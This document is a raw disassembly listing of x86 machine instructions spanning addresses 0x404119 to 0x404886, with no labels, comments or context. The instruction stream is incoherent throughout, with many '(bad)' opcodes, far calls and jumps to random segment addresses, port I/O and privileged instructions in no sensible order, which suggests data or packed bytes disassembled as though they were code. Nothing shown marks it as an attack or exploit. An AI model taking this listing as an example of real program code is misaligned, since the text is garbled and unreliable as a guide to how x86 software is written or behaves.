  404119:	mov    ebp,0x902813a4
  40411e:	mov    dh,BYTE PTR [ebp-0x445afc2a]
  404124:	popf   
  404125:	data16 rcl BYTE PTR [esi-0xc0efbb7],0x5b
  40412d:	imul   ebp,DWORD PTR [ebp+0x75],0xbbb8d909
  404134:	cdq    
  404135:	add    eax,DWORD PTR [esi+eax*1]
  404138:	icebp  
  404139:	jbe    0x404170
  40413b:	sub    al,0xc6
  40413d:	daa    
  40413e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40413f:	push   ds
  404140:	mov    ds:0x921c5d2b,eax
  404145:	mov    ds:0x9a21452d,eax
  40414a:	inc    edi
  40414b:	cli    
  40414c:	xchg   esi,eax
  40414d:	stos   BYTE PTR es:[edi],al
  40414e:	mov    ah,ah
  404150:	ret    
  404151:	addr16 or esi,esp
  404154:	cmp    BYTE PTR [eax-0x3a3ba9ae],al
  40415a:	xchg   edx,eax
  40415b:	mov    cs,WORD PTR [ebp-0x55]
  40415e:	aad    0xd0
  404160:	jle    0x40412d
  404162:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404163:	push   ebx
  404164:	mov    al,0x47
  404166:	dec    ecx
  404167:	jbe    0x4041a2
  404169:	prefetch BYTE PTR [edi-0x44]
  40416d:	call   0xa346:0x8bb5b753
  404174:	xchg   esi,eax
  404175:	mov    eax,ds:0xe6b2e6b5
  40417a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40417b:	je     0x404163
  40417d:	mov    gs,WORD PTR [ecx-0x34]
  404180:	frstor [ebp+ecx*8-0x6ac1fa91]
  404187:	es ror dl,0x3f
  40418b:	lahf   
  40418c:	gs xchg edi,eax
  40418e:	inc    ebp
  40418f:	pop    ecx
  404190:	push   esi
  404191:	jo     0x404145
  404193:	pop    ds
  404194:	jns    0x4041c7
  404196:	(bad)  
  404197:	push   ebx
  404198:	push   ebp
  404199:	xchg   ebp,eax
  40419a:	loopne 0x404211
  40419c:	xchg   esp,eax
  40419d:	inc    esp
  40419e:	jecxz  0x404134
  4041a0:	stos   DWORD PTR es:[edi],eax
  4041a1:	lahf   
  4041a2:	and    al,0xea
  4041a4:	jns    0x404220
  4041a6:	xor    BYTE PTR ds:0xd4784345,ah
  4041ac:	jle    0x404155
  4041ae:	mov    dl,bl
  4041b0:	in     eax,0xd6
  4041b2:	inc    edi
  4041b3:	int    0x9f
  4041b5:	sbb    al,0xc1
  4041b7:	pop    ecx
  4041b8:	std    
  4041b9:	gs mov ch,0x19
  4041bc:	and    bl,BYTE PTR [eax+0x53]
  4041bf:	ret    0x58c4
  4041c2:	inc    edx
  4041c3:	cwde   
  4041c4:	fst    DWORD PTR [ecx-0x7d]
  4041c7:	and    al,BYTE PTR ds:0xa921000d
  4041cd:	mov    cl,bl
  4041cf:	neg    DWORD PTR [eax]
  4041d1:	out    dx,eax
  4041d2:	fs cld 
  4041d4:	scas   eax,DWORD PTR es:[edi]
  4041d5:	leave  
  4041d6:	jmp    0xc392:0x3f8dc3c5
  4041dd:	jae    0x4041cb
  4041df:	xchg   esi,eax
  4041e0:	test   eax,0x90054d6
  4041e5:	mov    edx,0x5fe8d70c
  4041ea:	into   
  4041eb:	sbb    dl,BYTE PTR [ebx+0x2f62d732]
  4041f1:	loopne 0x404200
  4041f3:	fmul   QWORD PTR [edx]
  4041f5:	ss dec ebx
  4041f7:	stc    
  4041f8:	bound  ecx,QWORD PTR [ecx+ebx*2]
  4041fb:	fnsave [ecx]
  4041fd:	mov    esi,0xd96fc174
  404202:	fistp  WORD PTR [eax]
  404204:	inc    ecx
  404205:	icebp  
  404206:	jo     0x40427c
  404208:	shl    dl,cl
  40420a:	push   eax
  40420b:	sub    cl,BYTE PTR [ebx]
  40420d:	retf   0x22a9
  404210:	cld    
  404211:	loopne 0x404239
  404213:	(bad)  
  404214:	inc    esi
  404215:	std    
  404216:	aaa    
  404217:	enter  0x4bab,0x75
  40421b:	sbb    ebp,DWORD PTR [esi]
  40421d:	mov    bh,0x9a
  40421f:	test   eax,0xa957116b
  404224:	popf   
  404225:	xchg   edi,eax
  404226:	sbb    ch,BYTE PTR [esi-0x29580edc]
  40422c:	mov    edi,0xa503840d
  404231:	imul   DWORD PTR [edx]
  404233:	xor    al,BYTE PTR [edi-0x2187fd33]
  404239:	pushf  
  40423a:	frstor ds:0xb77fc92d
  404240:	popf   
  404241:	push   esi
  404242:	aad    0xaa
  404244:	fs ins BYTE PTR es:[edi],dx
  404246:	call   0x4a980c44
  40424b:	cmp    eax,edx
  40424d:	iret   
  40424e:	imul   edi,DWORD PTR [ebx-0x1cb501e],0xffffffa8
  404255:	cwde   
  404256:	and    BYTE PTR [ecx],dh
  404258:	mov    al,ds:0xe8205249
  40425d:	shl    BYTE PTR [ebx-0x67],0xfd
  404261:	aad    0xe8
  404263:	addr16 xchg edi,eax
  404265:	sub    al,0x74
  404267:	mov    ebx,0xbc1a6f1a
  40426c:	cmp    esp,DWORD PTR [esp+edx*8]
  40426f:	fstp   QWORD PTR [esi]
  404271:	inc    eax
  404272:	add    eax,0xc2d0e12
  404277:	lods   al,BYTE PTR ds:[esi]
  404278:	shl    DWORD PTR [esi+0x56],1
  40427b:	push   0xffffffed
  40427d:	cmp    ah,cl
  40427f:	push   edx
  404280:	sub    esi,DWORD PTR [ecx]
  404282:	add    eax,0x49774615
  404287:	jno    0x4042f4
  404289:	sbb    eax,0xc750cc9d
  40428e:	adc    al,0xf3
  404290:	xchg   esi,eax
  404291:	xor    DWORD PTR [ebx+0x1ce9d0b5],esp
  404297:	repz or DWORD PTR [edx+ebp*4-0xd896aa3],ecx
  40429f:	bound  edx,QWORD PTR [eax-0x9]
  4042a2:	mov    dh,0xd6
  4042a4:	jl     0x4042d8
  4042a6:	test   DWORD PTR [ecx],eax
  4042a8:	into   
  4042a9:	retf   
  4042aa:	sub    edi,edi
  4042ac:	adc    ebp,edx
  4042ae:	sar    ebp,0x12
  4042b1:	adc    DWORD PTR [eax],ebp
  4042b3:	xlat   BYTE PTR cs:[ebx]
  4042b5:	jno    0x4042ab
  4042b7:	adc    BYTE PTR [esi],0xe9
  4042ba:	fisttp QWORD PTR [edx]
  4042bc:	dec    eax
  4042bd:	(bad)  
  4042be:	stos   DWORD PTR es:[edi],eax
  4042bf:	inc    ebp
  4042c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042c1:	call   0x3858:0x3fe96637
  4042c8:	jl     0x404308
  4042ca:	jge    0x40430c
  4042cc:	ficom  WORD PTR [ebp+0x5e8d520a]
  4042d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042d3:	mov    dl,0xa
  4042d5:	loop   0x40425e
  4042d7:	loopne 0x4042c0
  4042d9:	ret    0x7c73
  4042dc:	jmp    0xc1f6:0x4f5a625f
  4042e3:	dec    ecx
  4042e4:	jae    0x404365
  4042e6:	pusha  
  4042e7:	mov    ah,0x67
  4042e9:	test   BYTE PTR ds:0xfe36c71a,cl
  4042ef:	sub    BYTE PTR [eax-0x4a],ah
  4042f2:	jge    0x4042d3
  4042f4:	push   ebp
  4042f5:	mov    BYTE PTR [ebx+eax*1],ah
  4042f8:	clc    
  4042f9:	cmp    dh,dl
  4042fb:	xor    eax,0xf97d9c59
  404300:	add    ebp,esp
  404302:	or     edi,DWORD PTR [eax+0x30]
  404305:	jmp    FWORD PTR [ecx]
  404307:	add    al,BYTE PTR [edi+0x3a]
  40430a:	push   es
  40430b:	fcomp  QWORD PTR [edx]
  40430d:	and    al,0x5b
  40430f:	in     al,dx
  404310:	sub    DWORD PTR [esi],0x75770e10
  404316:	xlat   BYTE PTR ds:[ebx]
  404317:	jp     0x404302
  404319:	and    eax,0xe4fa1206
  40431e:	mov    cl,0x8f
  404320:	or     DWORD PTR ss:[esi+0x3345dd61],edi
  404327:	inc    edx
  404328:	mov    al,0x82
  40432a:	jge    0x40430b
  40432c:	jne    0x4042f3
  40432e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40432f:	into   
  404330:	push   ds
  404331:	lds    eax,FWORD PTR [ebx]
  404333:	shr    DWORD PTR [ecx],1
  404335:	cmp    ecx,DWORD PTR [ecx+0x50]
  404338:	lahf   
  404339:	(bad)  
  40433a:	ins    BYTE PTR es:[edi],dx
  40433b:	sbb    al,BYTE PTR [ecx]
  40433d:	repz add eax,0xa1b53020
  404343:	and    esp,DWORD PTR ds:[ebp+0x55ef275b]
  40434a:	xchg   DWORD PTR [edx+ebp*4],ecx
  40434d:	xchg   ebp,ecx
  40434f:	(bad)  
  404350:	pop    eax
  404351:	pop    ss
  404352:	pop    esp
  404353:	out    0xf6,al
  404355:	xlat   BYTE PTR ds:[ebx]
  404356:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404357:	fwait
  404358:	mov    eax,0x890a7e46
  40435d:	xchg   edx,eax
  40435e:	jle    0x4043b2
  404360:	cmp    eax,0x30d1df66
  404365:	shl    DWORD PTR [ebp+0x53],1
  404368:	inc    ebx
  404369:	mov    al,BYTE PTR [esi-0x6423a0e]
  40436f:	push   edx
  404370:	ror    DWORD PTR [ebx],1
  404372:	test   al,bh
  404374:	loope  0x404308
  404376:	or     eax,0x6c782e51
  40437b:	xchg   ebx,eax
  40437c:	jns    0x4043be
  40437e:	pop    ecx
  40437f:	icebp  
  404380:	cmc    
  404381:	mov    cl,0x90
  404383:	shl    al,cl
  404385:	push   ss
  404386:	inc    ebp
  404387:	jp     0x4043f8
  404389:	sub    DWORD PTR [edx+esi*2+0x76],0x1d
  40438e:	jge    0x404405
  404390:	ficomp DWORD PTR [edi+0x4ba4a37f]
  404396:	mov    ch,0x8
  404398:	dec    ebp
  404399:	nop
  40439a:	outs   dx,BYTE PTR ds:[esi]
  40439b:	cli    
  40439c:	jnp    0x4043f0
  40439e:	cwde   
  40439f:	and    cl,BYTE PTR [ebx]
  4043a1:	cmp    edx,DWORD PTR [ebx]
  4043a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043a4:	add    si,cx
  4043a7:	adc    DWORD PTR [edx-0x31],esi
  4043aa:	aas    
  4043ab:	cmp    DWORD PTR [ecx],esi
  4043ad:	(bad)  
  4043ae:	in     eax,dx
  4043af:	xlat   BYTE PTR ds:[ebx]
  4043b0:	imul   edx,DWORD PTR [ecx+0x71908aab],0x912a7a62
  4043ba:	sbb    ah,BYTE PTR [esp+ecx*1]
  4043bd:	or     al,0xd
  4043bf:	inc    BYTE PTR [edi]
  4043c1:	loope  0x404377
  4043c3:	addr16 imul edi
  4043c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043c7:	dec    edx
  4043c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043c9:	imul   ecx,DWORD PTR [ecx+edi*2],0x38844b77
  4043d0:	mov    esp,0x42bb6519
  4043d5:	push   ebp
  4043d6:	idiv   esi
  4043d8:	adc    al,0x41
  4043da:	retf   0xe23c
  4043dd:	fwait
  4043de:	in     al,0xb
  4043e0:	push   edi
  4043e1:	sub    al,0x31
  4043e3:	stc    
  4043e4:	cmp    al,0x32
  4043e6:	ins    DWORD PTR es:[edi],dx
  4043e7:	inc    edi
  4043e8:	pop    ebp
  4043e9:	repnz add al,0x2e
  4043ec:	pop    edi
  4043ed:	fld    DWORD PTR [ecx]
  4043ef:	rol    BYTE PTR [ebx-0xf0decd6],cl
  4043f5:	sub    eax,0xae07714d
  4043fa:	call   0xb9b90453
  4043ff:	je     0x404476
  404401:	mov    WORD PTR [ebp-0x555a8bbf],ds
  404407:	fyl2x  
  404409:	scas   eax,DWORD PTR es:[edi]
  40440a:	or     eax,0x4bea29f
  40440f:	test   BYTE PTR [eax+0x47],ch
  404412:	push   esi
  404413:	sbb    esp,ecx
  404415:	push   ebp
  404416:	nop
  404417:	dec    ecx
  404418:	test   DWORD PTR [edi-0x1e],ecx
  40441b:	mov    ah,0x87
  40441d:	(bad)  
  40441e:	loopne 0x40444d
  404420:	das    
  404421:	push   edi
  404422:	ror    cl,0xbb
  404425:	mov    bh,0x3a
  404427:	xchg   edi,eax
  404428:	test   cl,dh
  40442a:	cli    
  40442b:	cmp    al,0xd9
  40442d:	cmp    BYTE PTR [ecx+0x75],ah
  404430:	rol    BYTE PTR [eax+0x1b7cb49e],0x25
  404437:	xchg   ecx,eax
  404438:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404439:	in     eax,dx
  40443a:	nop
  40443b:	lahf   
  40443c:	sbb    DWORD PTR [eax],esi
  40443e:	xor    eax,0x7099b3e6
  404443:	outs   dx,BYTE PTR ds:[esi]
  404444:	pushf  
  404445:	ror    edx,0xf7
  404448:	stc    
  404449:	jp     0x4044ad
  40444b:	inc    ebx
  40444c:	fisub  DWORD PTR [edx-0x25]
  40444f:	repz fwait
  404451:	sti    
  404452:	aam    0x59
  404454:	fcom   QWORD PTR [edi-0x13]
  404457:	imul   DWORD PTR [eax]
  404459:	stos   DWORD PTR es:[edi],eax
  40445a:	ret    
  40445b:	add    al,0xf7
  40445d:	(bad)  
  40445e:	fimul  DWORD PTR [esi+0x23]
  404461:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404462:	sahf   
  404463:	outs   dx,DWORD PTR ds:[esi]
  404464:	retf   
  404465:	mov    dl,0x20
  404467:	(bad)  
  404468:	fild   DWORD PTR [ecx+0x20]
  40446b:	(bad)  
  40446c:	xor    al,0xf2
  40446e:	mov    dl,0xcf
  404470:	outs   dx,DWORD PTR ds:[esi]
  404471:	enter  0x21c3,0xcf
  404475:	xor    al,0x42
  404477:	adc    ebx,DWORD PTR [edx+0x75]
  40447a:	pop    edi
  40447b:	inc    edi
  40447c:	xor    BYTE PTR [ebx+0x3f],ch
  40447f:	jbe    0x40443e
  404481:	and    edi,0xe8d12eb5
  404487:	cmp    dh,BYTE PTR [edi+0x76be5755]
  40448d:	and    BYTE PTR [ebx],0x2a
  404490:	std    
  404491:	pop    ebx
  404492:	fisttp DWORD PTR [ebx]
  404494:	gs jmp 0x4044a0
  404497:	push   ecx
  404498:	dec    eax
  404499:	fdivr  DWORD PTR [ebx+0x1b100ec8]
  40449f:	push   cs
  4044a0:	inc    ecx
  4044a1:	jmp    0x404428
  4044a3:	in     eax,dx
  4044a4:	imul   eax,DWORD PTR [edx+0x18],0x3c
  4044a8:	hlt    
  4044a9:	mov    dh,BYTE PTR [ebp-0x1c]
  4044ac:	jmp    0xec7f:0x904daa33
  4044b3:	sub    eax,0x387332a9
  4044b8:	cmp    DWORD PTR [ebx],esp
  4044ba:	push   es
  4044bb:	cmp    BYTE PTR [edi+0x49],ah
  4044be:	xlat   BYTE PTR ds:[ebx]
  4044bf:	sub    ebx,ebx
  4044c1:	test   al,0x92
  4044c3:	adc    BYTE PTR [ebx+0x6a],al
  4044c6:	pop    ds
  4044c7:	(bad)  
  4044c8:	and    al,0x96
  4044ca:	dec    DWORD PTR [ebp+0x38]
  4044cd:	sti    
  4044ce:	mov    ebx,0xd051c1d6
  4044d3:	stos   BYTE PTR es:[edi],al
  4044d4:	cmp    DWORD PTR [ecx+eax*4+0x7773dd4e],0xe
  4044dc:	sbb    DWORD PTR [esp+ebp*1+0x1b],esp
  4044e0:	into   
  4044e1:	dec    edx
  4044e2:	dec    ebp
  4044e3:	cdq    
  4044e4:	stos   DWORD PTR es:[edi],eax
  4044e5:	jp     0x4044a9
  4044e7:	clc    
  4044e8:	test   BYTE PTR [ebp-0x50],bl
  4044eb:	pop    eax
  4044ec:	mov    al,0x2e
  4044ee:	sbb    DWORD PTR [edx-0xe],edx
  4044f1:	dec    edi
  4044f2:	jle    0x40450f
  4044f4:	cmp    ecx,0xe7503e33
  4044fa:	cmp    DWORD PTR [ebp+0x40],ebp
  4044fd:	adc    ebx,DWORD PTR [ebx+0x2a75416c]
  404503:	out    dx,eax
  404504:	lahf   
  404505:	adc    DWORD PTR [ecx-0x4e2793a6],esp
  40450b:	pusha  
  40450c:	je     0x4044bc
  40450e:	aaa    
  40450f:	cmp    ebp,ebx
  404511:	test   BYTE PTR [eax-0x75],ch
  404514:	or     eax,0xf96b39a0
  404519:	fincstp 
  40451b:	mov    esp,DWORD PTR [eax-0x52]
  40451e:	inc    ebx
  40451f:	ins    BYTE PTR es:[edi],dx
  404520:	inc    ebx
  404521:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404522:	cmp    bh,BYTE PTR [edi-0x64]
  404525:	test   BYTE PTR [ecx],ch
  404527:	jne    0x4044f3
  404529:	lods   al,BYTE PTR ds:[esi]
  40452a:	xchg   ebx,eax
  40452b:	push   edx
  40452c:	inc    BYTE PTR [edi]
  40452e:	in     eax,dx
  40452f:	push   ss
  404530:	push   ecx
  404531:	push   esp
  404532:	cli    
  404533:	or     ecx,DWORD PTR [esi+0xf230419]
  404539:	les    esi,FWORD PTR [ebx+0x44c9be1a]
  40453f:	push   esp
  404540:	jns    0x40459b
  404542:	(bad)  
  404543:	call   0x6ca36158
  404548:	cdq    
  404549:	sti    
  40454a:	ins    BYTE PTR es:[edi],dx
  40454b:	and    ecx,DWORD PTR [ecx+0x3c61e63f]
  404551:	aam    0xb1
  404553:	push   ebx
  404554:	xchg   esi,eax
  404555:	pop    ebx
  404556:	test   BYTE PTR [ebp+0x4a],ch
  404559:	jp     0x4044f1
  40455b:	mov    cl,BYTE PTR [ebx]
  40455d:	mov    ecx,0x73ece536
  404562:	push   esp
  404563:	push   ss
  404564:	mov    ch,0x73
  404566:	or     eax,DWORD PTR [ebx-0x3e73dbcd]
  40456c:	repnz test al,0xe8
  40456f:	jmp    0x4044fd
  404571:	pop    edx
  404572:	xchg   ebp,eax
  404573:	fadd   DWORD PTR [ecx+eax*1+0x1e]
  404577:	sbb    al,0x9c
  404579:	push   esi
  40457a:	ds jb  0x4045e3
  40457d:	or     edx,DWORD PTR [edx+ebp*2+0x107fd582]
  404584:	cmp    BYTE PTR [ebx+0x2267f7d6],ah
  40458a:	js     0x404544
  40458c:	icebp  
  40458d:	add    eax,0x48fe94b2
  404592:	lock mov dh,0x9d
  404595:	rol    BYTE PTR [ebx+eiz*8],cl
  404598:	jno    0x404522
  40459a:	dec    ebp
  40459b:	or     eax,esp
  40459d:	pop    es
  40459e:	jno    0x4045e9
  4045a0:	xchg   ebp,eax
  4045a1:	jmp    0xb39f513d
  4045a6:	mov    es,WORD PTR [ebx+0x3f]
  4045a9:	inc    ecx
  4045aa:	sub    ebx,DWORD PTR [eax+ebp*2-0x37cab832]
  4045b1:	inc    esi
  4045b2:	in     eax,dx
  4045b3:	lods   eax,DWORD PTR ds:[esi]
  4045b4:	leave  
  4045b5:	ficom  DWORD PTR [eax+0x5c2218d2]
  4045bb:	mov    bh,0x58
  4045bd:	pop    esi
  4045be:	ret    0x8c7e
  4045c1:	cli    
  4045c2:	fcomp  QWORD PTR [edx]
  4045c4:	pop    esi
  4045c5:	adc    eax,0xf2c726c4
  4045ca:	pop    es
  4045cb:	jmp    0x4045ca
  4045cd:	xlat   BYTE PTR ds:[ebx]
  4045ce:	icebp  
  4045cf:	lods   al,BYTE PTR ds:[esi]
  4045d0:	sub    eax,DWORD PTR ds:0xb14c85f4
  4045d6:	jmp    0x40458f
  4045d8:	pusha  
  4045d9:	outs   dx,DWORD PTR ds:[esi]
  4045da:	add    ah,BYTE PTR [edi+ebp*1]
  4045dd:	nop
  4045de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045df:	aad    0xe9
  4045e1:	or     eax,0xbe19360e
  4045e6:	adc    dh,BYTE PTR [ecx-0xcbc6aae]
  4045ec:	xor    ecx,ebx
  4045ee:	test   BYTE PTR [eax],dh
  4045f0:	mov    esp,0x39134276
  4045f5:	mov    cl,BYTE PTR [ebp*8+0x23fa1b16]
  4045fc:	(bad)  
  4045fd:	push   edx
  4045fe:	je     0x404674
  404600:	push   ss
  404601:	lds    ebp,FWORD PTR [ebx]
  404603:	jae    0x4045df
  404605:	jbe    0x40459a
  404607:	xchg   DWORD PTR [ebx],edi
  404609:	cli    
  40460a:	dec    ecx
  40460b:	mov    bh,0x90
  40460d:	pop    es
  40460e:	lea    edi,[eax+0x732c88a]
  404614:	pop    ecx
  404615:	sti    
  404616:	mov    cs,WORD PTR [edx]
  404618:	fnstenv [edx]
  40461a:	xor    BYTE PTR [ecx+0x64],dh
  40461d:	stos   DWORD PTR es:[edi],eax
  40461e:	scas   al,BYTE PTR es:[edi]
  40461f:	std    
  404620:	jne    0x40461a
  404622:	mov    esp,0xa0cd925e
  404627:	mov    bh,0xb2
  404629:	xlat   BYTE PTR ds:[ebx]
  40462a:	jo     0x404681
  40462c:	ds sub eax,0x1e022096
  404632:	push   edi
  404633:	or     DWORD PTR [ecx+0x4bcefb43],esp
  404639:	xor    al,0xf2
  40463b:	fbld   TBYTE PTR [edx-0x70]
  40463e:	xchg   edx,eax
  40463f:	es ins BYTE PTR es:[edi],dx
  404641:	test   DWORD PTR [ebx+edx*2],esp
  404644:	cld    
  404645:	lods   al,BYTE PTR ds:[esi]
  404646:	rcr    DWORD PTR [esi+0x3c],0x15
  40464a:	push   0x3cb6db39
  40464f:	outs   dx,BYTE PTR ds:[esi]
  404650:	fidivr WORD PTR ds:0xd4f6552c
  404656:	or     dh,BYTE PTR [ecx+ecx*1-0x5ab995f1]
  40465d:	and    BYTE PTR [ebx*8-0x51403f20],bh
  404664:	add    BYTE PTR [ebx+esi*8],0xd
  404668:	jl     0x40469a
  40466a:	in     eax,0x3e
  40466c:	push   edi
  40466d:	push   0x1f9a8d8f
  404672:	cmp    BYTE PTR [esi*1+0x5bb7660],dl
  404679:	jle    0x4046c1
  40467b:	loopne 0x40466f
  40467d:	sub    BYTE PTR [ecx-0x19],ah
  404680:	and    eax,0x3aabda02
  404685:	call   0xe02c:0x48f5ba55
  40468c:	mov    al,ds:0x323ef9fd
  404691:	push   ecx
  404692:	in     eax,dx
  404693:	and    dh,dl
  404695:	rcr    DWORD PTR [edi*1+0x5eb67929],1
  40469c:	outs   dx,DWORD PTR ds:[esi]
  40469d:	out    dx,al
  40469e:	xchg   ebp,eax
  40469f:	in     al,0x9
  4046a1:	stos   DWORD PTR es:[edi],eax
  4046a2:	js     0x404722
  4046a4:	mov    ch,0xd7
  4046a6:	sub    eax,0x962ceb2f
  4046ab:	mov    ds:0x60ec9ce3,al
  4046b0:	adc    cl,BYTE PTR [esp+ebp*1+0x67d01292]
  4046b7:	mov    al,ds:0x98410e68
  4046bc:	pop    edi
  4046bd:	in     al,dx
  4046be:	ror    BYTE PTR [esi-0x6b],cl
  4046c1:	mov    esi,0xc48daf00
  4046c6:	in     eax,0x42
  4046c8:	fld    DWORD PTR [edi]
  4046ca:	xor    eax,0xa123d234
  4046cf:	daa    
  4046d0:	sub    ebp,DWORD PTR [ebp+0x5880b0c5]
  4046d6:	add    edi,edi
  4046d8:	push   0x8fde1356
  4046dd:	push   esi
  4046de:	sbb    esp,DWORD PTR [ebp*2-0x521f0f8c]
  4046e5:	add    al,BYTE PTR [esi]
  4046e7:	jle    0x40468c
  4046e9:	xchg   esi,eax
  4046ea:	ret    
  4046eb:	stos   BYTE PTR es:[edi],al
  4046ec:	inc    ebx
  4046ed:	xchg   esi,eax
  4046ee:	xchg   ebp,eax
  4046ef:	pop    es
  4046f0:	jecxz  0x404710
  4046f2:	jo     0x404755
  4046f4:	adc    al,0x6c
  4046f6:	ins    BYTE PTR es:[edi],dx
  4046f7:	pop    eax
  4046f8:	movq   QWORD PTR [ebx+0x4280a728],mm1
  4046ff:	pop    ebp
  404700:	fstp   QWORD PTR [eax]
  404702:	adc    ah,bl
  404704:	push   ecx
  404705:	and    al,0x73
  404707:	stos   BYTE PTR es:[edi],al
  404708:	jmp    0xd326:0xa4654c00
  40470f:	jns    0x40474b
  404711:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404712:	cmc    
  404713:	jno    0x40472e
  404715:	adc    edx,ebp
  404717:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404718:	loopne 0x404774
  40471a:	jge    0x404749
  40471c:	cmp    ecx,DWORD PTR [ebx+0x19faf8e]
  404722:	xchg   cl,ah
  404724:	popf   
  404725:	imul   ebp,DWORD PTR [ebx+0x20],0x44
  404729:	jb     0x4046b8
  40472b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40472c:	or     ebx,DWORD PTR cs:[edx+ebx*8+0x65]
  404731:	leave  
  404732:	mov    cl,0x58
  404734:	lods   eax,DWORD PTR ds:[esi]
  404735:	push   ss
  404736:	ja     0x4046dc
  404738:	fdiv   QWORD PTR [ecx]
  40473a:	repnz loope 0x4047a2
  40473d:	pop    ds
  40473e:	adc    ebp,DWORD PTR [ecx-0x5b554fe9]
  404744:	sbb    BYTE PTR [ebp+eax*1+0x208bc34d],al
  40474b:	out    0xd9,al
  40474d:	mov    ebp,0xf418cdcd
  404752:	stos   BYTE PTR es:[edi],al
  404753:	pop    ecx
  404754:	std    
  404755:	jbe    0x404733
  404757:	sbb    ch,BYTE PTR [ecx+ebx*2+0x71]
  40475b:	out    0xbe,al
  40475d:	sar    esp,cl
  40475f:	sub    eax,0xac66069
  404764:	pop    ds
  404765:	xor    edx,DWORD PTR [ecx+edx*8+0x14319aee]
  40476c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40476d:	cld    
  40476e:	enter  0xf6a7,0xcd
  404772:	js     0x40472a
  404774:	push   es
  404775:	retf   
  404776:	pop    eax
  404777:	bound  ecx,QWORD PTR [edx-0x52]
  40477a:	jne    0x404704
  40477c:	push   cs
  40477d:	sti    
  40477e:	sbb    ebx,eax
  404780:	fld    TBYTE PTR [ecx+eax*2]
  404783:	icebp  
  404784:	(bad)  
  404785:	pop    edi
  404786:	ins    DWORD PTR es:[edi],dx
  404787:	jns    0x4047a4
  404789:	push   ss
  40478a:	popa   
  40478b:	pop    ebp
  40478c:	test   BYTE PTR [esi-0x1d],dl
  40478f:	sub    edx,DWORD PTR [esi+0xa]
  404792:	retf   
  404793:	mov    dl,0x9d
  404795:	xchg   esp,eax
  404796:	jmp    0x713e811
  40479b:	pop    esi
  40479c:	adc    eax,0xee7b7aef
  4047a1:	rol    ebp,1
  4047a3:	pop    es
  4047a4:	mul    BYTE PTR [edi]
  4047a6:	and    BYTE PTR gs:[ebp-0x35f171ff],ah
  4047ad:	clc    
  4047ae:	jle    0x404737
  4047b0:	xchg   ecx,eax
  4047b1:	cmp    al,0x9b
  4047b3:	ins    DWORD PTR es:[edi],dx
  4047b4:	aas    
  4047b5:	sbb    esi,edx
  4047b7:	(bad)  
  4047b8:	mov    bh,0x94
  4047ba:	jb     0x40479b
  4047bc:	jg     0x40473e
  4047be:	mov    cl,0x60
  4047c0:	add    al,0x8a
  4047c2:	cmp    DWORD PTR [edi-0x33a98804],edx
  4047c8:	mov    ebx,0x34973c3
  4047cd:	xor    DWORD PTR [esi],eax
  4047cf:	jb     0x4047c2
  4047d1:	int    0xb4
  4047d3:	mov    DWORD PTR [eax-0x74],esi
  4047d6:	popf   
  4047d7:	jbe    0x404837
  4047d9:	mov    dl,0x38
  4047db:	aad    0x3d
  4047dd:	adc    al,BYTE PTR [edi-0x2e]
  4047e0:	retf   
  4047e1:	sar    ebp,cl
  4047e3:	adc    al,0xf3
  4047e5:	shl    DWORD PTR [ebx],0x2
  4047e8:	adc    esp,DWORD PTR [ebx]
  4047ea:	fwait
  4047eb:	sub    bl,BYTE PTR [ebp+ebp*8-0x5d]
  4047ef:	retf   0x402d
  4047f2:	mov    eax,esp
  4047f4:	ja     0x4047b5
  4047f6:	dec    eax
  4047f7:	test   eax,0xf99ce08
  4047fc:	cmp    al,0x92
  4047fe:	les    ecx,FWORD PTR [eax-0x50]
  404801:	in     al,0x22
  404803:	jne    0x4047df
  404805:	mov    ch,0xfc
  404807:	push   eax
  404808:	mov    ecx,0x6249ac5d
  40480d:	sub    BYTE PTR [ebx+0x2a],0x67
  404811:	sar    DWORD PTR [edi-0x1d43c8c9],cl
  404817:	inc    ebp
  404818:	std    
  404819:	pusha  
  40481a:	adc    DWORD PTR [ebx+ebp*2],ebp
  40481d:	xor    al,0xb4
  40481f:	rol    DWORD PTR [ebx+0xa1a11d5],cl
  404825:	(bad)  
  404826:	sti    
  404827:	pop    ecx
  404828:	test   DWORD PTR [edx],0x4600d32a
  40482e:	add    al,0x5
  404830:	outs   dx,DWORD PTR ds:[esi]
  404831:	call   0x607a1c2
  404836:	mov    dh,cl
  404838:	cwde   
  404839:	push   cs
  40483a:	mov    dl,0x39
  40483c:	lds    ecx,FWORD PTR [ecx-0x17]
  40483f:	gs in  al,dx
  404841:	jp     0x404828
  404843:	mov    dh,0x75
  404845:	push   0xffffffa4
  404847:	xlat   BYTE PTR ds:[ebx]
  404848:	mov    esi,0x75edabb2
  40484d:	mov    dl,0xac
  40484f:	pop    esp
  404850:	sub    al,0xc6
  404852:	inc    edi
  404853:	loopne 0x4047e7
  404855:	jo     0x40482b
  404857:	mov    dh,bl
  404859:	std    
  40485a:	stc    
  40485b:	inc    ebx
  40485c:	leave  
  40485d:	mov    edx,esp
  40485f:	fnsave [edi]
  404861:	mov    ecx,cs
  404863:	leave  
  404864:	cmp    ch,BYTE PTR [eax*4+0x44023642]
  40486b:	cld    
  40486c:	jbe    0x4048a7
  40486e:	jle    0x4048c7
  404870:	mov    dl,BYTE PTR [eax-0x5a422dfb]
  404876:	retf   0x2912
  404879:	test   BYTE PTR [ecx],ch
  40487b:	pop    ss
  40487c:	xchg   esp,eax
  40487d:	adc    DWORD PTR [edi],edi
  40487f:	test   BYTE PTR [ebx+eiz*4+0x3a04eaca],bl
  404886:	mov    edx,0x750e6a3f
